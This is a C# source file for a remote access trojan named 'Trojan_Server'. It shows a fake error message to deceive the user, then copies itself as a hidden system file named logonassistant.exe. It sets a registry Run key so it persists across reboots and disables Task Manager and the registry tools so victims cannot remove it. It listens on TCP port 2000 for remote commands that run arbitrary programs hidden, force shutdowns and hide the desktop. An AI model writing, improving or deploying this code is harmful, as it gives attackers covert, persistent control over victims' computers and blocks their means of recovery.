using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.IO;
using Microsoft.Win32;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;

namespace Trojan_Server
{
    class Program
    {
        public Type typeShell=null;
        public object objShell=Type.Missing;
        
        private const int SWP_HIDEWINDOW = 0x80;
        private const int SWP_SHOWWINDOW = 0x40;

        [DllImport("user32.dll")]
        public static extern bool SetWindowPos(
        int hWnd,
        int hWndInsertAfter,  
        short X,  
        short Y,
        short cx,
        short cy,
        uint uFlags
        );

        [DllImport("user32.dll")]
        public static extern int FindWindow(
        string lpClassName,   
        string lpWindowName    
        );
        [DllImport("user32.dll")]
		public static extern int ShowWindow(int Wnd, int Flags);

        public static NetworkStream Reciver;
        [DllImport("kernel32.dll")]
        public static extern bool FreeConsole();
        public static void Recive()
        {
            while (true)
            {
                try
                {
                    byte[] RecPacket = new byte[1000];
                    Reciver.Read(RecPacket, 0, RecPacket.Length);
                    Reciver.Flush();
                    string Command = Encoding.ASCII.GetString(RecPacket);
                    string[] CommandArray = System.Text.RegularExpressions.Regex.Split(Command, "!!!!---");
                    Command = CommandArray[0];
                    switch(Command)
                    {
                        case "MESSAGE":
                            string Msg = CommandArray[1];
                            System.Windows.Forms.MessageBox.Show(Msg.Trim('\0'));
                            Log("Sent Command Message with Message " + Msg.Trim('\0') , "COMMAND");
                            break;
                        case "OPENSITE":
                            string Site = CommandArray[1];
                            System.Diagnostics.Process IE = new System.Diagnostics.Process();
                            IE.StartInfo.FileName = "iexplore.exe";
                            IE.StartInfo.Arguments = Site.Trim('\0');
                            IE.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Maximized;
                            IE.Start();
                            Log("Opend Website:" + Site.Trim('\0') , "COMMAND");
                            break;
                        case "REBOOT":
                            string RebootTime = CommandArray[1];
                            System.Diagnostics.Process reboot = new System.Diagnostics.Process();
                            reboot.StartInfo.FileName = "shutdown";
                            reboot.StartInfo.Arguments = "-r -t " + RebootTime.Trim('\0');
                            reboot.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                            reboot.Start();
                            Log("System Restarted after " +RebootTime.Trim('\0') + "s !" , "COMMAND");
                            break;
                        case "SHUTDOWN":
                            string ShutdownTime = CommandArray[1];
                            System.Diagnostics.Process shutdown = new System.Diagnostics.Process();
                            shutdown.StartInfo.FileName = "shutdown";
                            shutdown.StartInfo.Arguments = "-s -t " + ShutdownTime.Trim('\0');
                            shutdown.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                            shutdown.Start();
                            Log("System Shutdown after " +ShutdownTime.Trim('\0') + "s !" , "COMMAND");
                            break;
                        case "LOGOFF":
                            System.Diagnostics.Process logoff = new System.Diagnostics.Process();
                            logoff.StartInfo.FileName = "shutdown";
                            logoff.StartInfo.Arguments = "/l";
                            logoff.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                            logoff.Start();
                            Log("Logoff done!", "COMMAND");
                            break;
                        case "CMDCOMMAND":
                            string CMDCommnd = CommandArray[1];
                            System.Diagnostics.Process Cmd = new System.Diagnostics.Process();
                            Cmd.StartInfo.FileName = CMDCommnd.Trim('\0');
                            Cmd.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                            Cmd.Start();
                            Log("Runned Command: " + CMDCommnd.Trim('\0') , "COMMAND");
                            break;
                        case "HIDETASKBAR":
                            int TaskBarHwnd;
                            TaskBarHwnd = FindWindow("Shell_traywnd", "");
                            SetWindowPos(TaskBarHwnd, 0, 0, 0, 0, 0, SWP_HIDEWINDOW);
                            Log("Hide Taskbar!", "COMMAND");
                            break;
                        case "SHOWTASKBAR":
                            int TaskBarHwnds;
                            TaskBarHwnds = FindWindow("Shell_traywnd", "");
                            SetWindowPos(TaskBarHwnds, 0, 0, 0, 0, 0, SWP_SHOWWINDOW);
                            Log("Show Taskbar!", "COMMAND");
                            break;
                        case "HIDEDESKTOPICONS":
                            ShowWindow(FindWindow("Progman", "Program Manager"), 0);
                            Log("Hide Desktop!", "COMMAND");
                            break;
                        case "SHOWDESKTOPICONS":
                            ShowWindow(FindWindow("Progman", "Program Manager"), 1);
                            Log("Show Desktop!", "COMMAND");
                            break;
                    }
                }
                catch
                {
                    break;

                }
            }
        }
        public static bool CheckIfRan()
        {
            bool IsRan = false;
            Log("RAT Starting Up!...", "ALWAYS");
            Log("龴ↀ◡ↀ龴", "ALWAYS");
            Log("Checking If Startup is already done!", "ALWAYS");
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe")) { 
                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                if (k.GetValue("logonassist") != null)
                {
                	Log("Startup is already done!", "DEBUG");
                    IsRan = true;
                }
                else
                {
                	Log("Trying to add to Startup!", "DEBUG");
                    IsRan = false;
                }
            }
            return IsRan;
        }
        public static void AddToStartup()
        {
            try
            {
            	Log("Trying to Copy File to C:/Windows/SystemWOW64/logonassistant.exe", "DEBUG");
                File.Copy(Convert.ToString(System.Reflection.Assembly.GetExecutingAssembly().Location), Convert.ToString(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe"), true);
                Log("Found System Folder: C:/Windows/SystemWOW64", "DEBUG");
                Log("File Copied to System Directory: C:/Windows/SystemWOW64/logonassistant.exe", "DEBUG");
                Log("Trying change File Attributes", "DEBUG");
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.Hidden);
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.System);
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\logonassistant.exe", FileAttributes.ReadOnly);
                Log("File made to System, Hidden and Readonly!", "DEBUG");
                Log("Trying to make Startup Key!", "DEBUG");
	                RegistryKey k = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
	                k.SetValue("logonassist", "C:\\Windows\\SysWOW64\\logonassistant.exe", RegistryValueKind.String);
	                k.Close();
                Log("Startup RegistryKey angelegt!", "DEBUG");
                Log("Trying to make DisableTaskMgr Key", "DEBUG");
                RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                objRegistryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
                objRegistryKey.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
                objRegistryKey.Close();
                Log("TaskManager disabled!", "DEBUG");
            }
            catch
            {
            	Log("Error while Adding to Startup!", "ERROR");
            }
            
        }
		
        public static string GetTempPath()
        {
        	string path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        	if (!path.EndsWith("\\")) path += "\\";
        	return path;
        }
        
        public static void Log(string msg, string art)
        {
        	System.IO.StreamWriter sw = System.IO.File.AppendText(
        		GetTempPath() + "RATLog.txt");
        	try
        	{
        		string logLine = System.String.Format(
        			"{0:G}: {1}: {2} ", System.DateTime.Now, art, msg);
        		sw.WriteLine(logLine);
        	}
        	finally 
        	{
        		sw.Close();
        	}
        }
        static void Main(string[] args)
        {
            FreeConsole();
            Log("Deleting old Log!" , "ALWAYS");
		try {
        
          	File.Delete(GetTempPath() + "RATLog.txt");
		}
		catch {
            	
		}
            bool Check = CheckIfRan();
            if (!Check)
            {
                System.Windows.Forms.MessageBox.Show("This Programm is not a valid Win32 Application!", "Error", System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
                Log("Showed Fake Messaage!" , "ALWAYS");
                AddToStartup();
            }
                TcpListener l = new TcpListener(2000);
                l.Start();
                Log("Started TcpListener..." , "ALWAYS");
                TcpClient Connection = l.AcceptTcpClient();
                Reciver = Connection.GetStream();
                System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(Recive));
                Log("Started Reciver!" , "ALWAYS");
                Rec.Start();
        }
    }
}
